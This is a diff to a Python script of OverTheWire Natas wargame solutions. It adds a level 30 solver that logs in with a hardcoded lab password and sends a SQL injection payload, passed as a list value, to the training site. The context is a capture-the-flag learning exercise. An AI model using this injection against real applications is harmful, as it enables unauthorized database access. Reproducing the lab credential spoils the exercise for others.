@@ -260,8 +260,20 @@ def level28():
     return True
 
 
+def level30():
+    import requests
+    from requests.auth import HTTPBasicAuth
+
+    credentials = HTTPBasicAuth('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')
+
+    parameters = {"username": "natas31", "password": ["'' or 1=1", 3]}
+    r = requests.post("http://natas30.natas.labs.overthewire.org/index.pl", data=parameters, auth=credentials)
+
+    print(r.text)
+
+
 def main():
-    levels = ('11', '16', '17', '18', '19', '28')
+    levels = ('11', '16', '17', '18', '19', '28', '30')
 
     print("Hi there!\n"
           "you've just run natas (http://overthewire.org/wargames/natas/) levels solutions. Not every level\n"
@@ -287,6 +299,8 @@ def main():
             level19()
         if level == '28':
             level28()
+        if level == '30':
+            level30()
     else:
         print("Hey! There is no such level. Bye bye!")
 
